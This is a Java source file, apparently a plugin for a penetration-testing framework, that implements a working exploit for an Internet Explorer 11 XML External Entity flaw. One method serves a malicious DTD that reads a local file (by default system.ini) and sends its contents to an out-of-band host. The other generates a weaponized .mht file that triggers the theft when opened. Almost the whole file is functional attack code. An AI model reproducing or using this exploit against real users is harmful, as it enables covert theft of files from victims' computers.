package com.trackray.module.mvc;

import com.trackray.base.annotation.Function;
import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.MVCPlugin;
import com.trackray.module.inner.FuckCeye;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;

import java.io.IOException;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/5/21 15:37
 */
@Plugin(title = "IE11 XXE" , value = "ie11XXE" , author = "浅蓝", desc = "需要在 application.properties 中配置 trackray.url(溯光在公网的URL) 和ceye")
@Rule
public class IE11XXE extends MVCPlugin{

    @Autowired
    private FuckCeye fuckCeye;

    @Value("${trackray.url}")
    private String trackrayURL;

    @Function(value = "data.xml")
    public void xml(){
        String file = param.getOrDefault("file","c:/windows/system.ini").toString();

        String url = "http://" + fuckCeye.identifier + "/";

        String xml = "<!ENTITY % data SYSTEM \""+file+"\">\n" +
                "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM '"+url+"?%data;'>\">\n" +
                "<!ENTITY % data SYSTEM \"file:///"+file+"\">\n" +
                "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM '"+url+"?%data;'>\">\n";
        try {
            response.getWriter().print(xml);
            response.getWriter().flush();
            response.getWriter().close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Function(value = "gen")
    public void gen(){

        String file = param.getOrDefault("file","c:/windows/system.ini").toString();
        String xmlurl = trackrayURL+"plugin/mvc/ie11XXE/data.xml?file="+file;

        String payload = "From:\n" +
                "Subject:\n" +
                "Date:\n" +
                "MIME-Version: 1.0\n" +
                "Content-Type: multipart/related; type=\"text/html\";\n" +
                "\tboundary=\"=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001\"\n" +
                "This is a multi-part message in MIME format.\n" +
                "\n" +
                "\n" +
                "--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001\n" +
                "Content-Type: text/html; charset=\"UTF-8\"\n" +
                "Content-Location: main.htm\n" +
                "\n" +
                "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/transitional.dtd\">\n" +
                "<html>\n" +
                "<head>\n" +
                "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n" +
                "<title>MSIE XXE 0day</title>\n" +
                "</head>\n" +
                "<body>\n" +
                "<xml>\n" +
                "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                "<!DOCTYPE r [\n" +
                "<!ELEMENT r ANY >\n" +
                "<!ENTITY % sp SYSTEM \""+xmlurl+"\">\n" +
                "%sp;\n" +
                "%param1;\n" +
                "]>\n" +
                "<r>&exfil;</r>\n" +
                "<r>&exfil;</r>\n" +
                "<r>&exfil;</r>\n" +
                "<r>&exfil;</r>\n" +
                "</xml>\n" +
                "<script>window.print();</script>\n" +
                "<table cellpadding=\"0\" cellspacing=\"0\" border=\"0\">\n" +
                "<tr>\n" +
                "<td class=\"contentcell-width\">\n" +
                "<h1>MSIE XML External Entity 0day PoC.</h1>\n" +
                "<h3>Discovery: hyp3rlinx</h3>\n" +
                "<h3>ApparitionSec</h3>\n" +
                "</td>\n" +
                "</tr>\n" +
                "</table>\n" +
                "</body>\n" +
                "</html>\n" +
                "\n" +
                "\n" +
                "--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001--";

        response.setHeader("Content-Disposition","attachment;filename=exp.mht");

        try {

            response.getWriter().print(payload);

            response.getWriter().flush();

            response.getWriter().close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    @Override
    public void index() {

        model.setViewName("index");
    }
}
